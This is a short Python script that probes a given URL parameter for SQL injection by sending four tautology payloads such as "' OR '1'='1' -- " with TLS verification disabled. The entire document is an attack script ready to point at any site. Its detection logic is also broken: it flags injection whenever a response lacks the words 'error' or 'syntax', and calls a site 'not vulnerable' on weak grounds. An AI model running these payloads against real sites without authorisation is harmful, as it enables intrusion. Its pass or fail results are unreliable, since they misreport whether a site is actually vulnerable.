import requests

def test_sql_injection(url, param):
    payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' ({", "' OR '1'='1') -- "]
    results = []
    
    for payload in payloads:
        test_url = requests.Request('GET', url, params={param: payload}).prepare().url
        print(f"Testing URL: {test_url}")
        r = requests.get(test_url, verify=False)
        if "error" not in r.text.lower() and "syntax" not in r.text.lower():
            results.append(f"Potential SQL Injection with payload: {payload}")
    
    if len(results) == 0:
        return ["The current website is not vulnerable to SQL injection"]
    else:
        return results